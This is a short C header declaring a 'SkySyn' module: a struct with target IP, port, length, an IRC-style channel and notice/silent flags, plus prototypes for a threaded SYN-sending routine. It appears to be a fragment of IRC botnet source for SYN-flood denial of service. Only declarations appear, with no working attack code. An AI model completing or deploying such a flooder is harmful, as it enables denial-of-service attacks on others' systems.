#ifndef NO_SKYSYN  
typedef struct SKYSYN {

	SOCKET sock;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SKYSYN;

DWORD WINAPI SkySynThread(LPVOID param);
long SkySynSend(unsigned long TargetIP, unsigned short TargetPort,int Times);
long SkySyn(char *target, char *port, char *len);
#endif
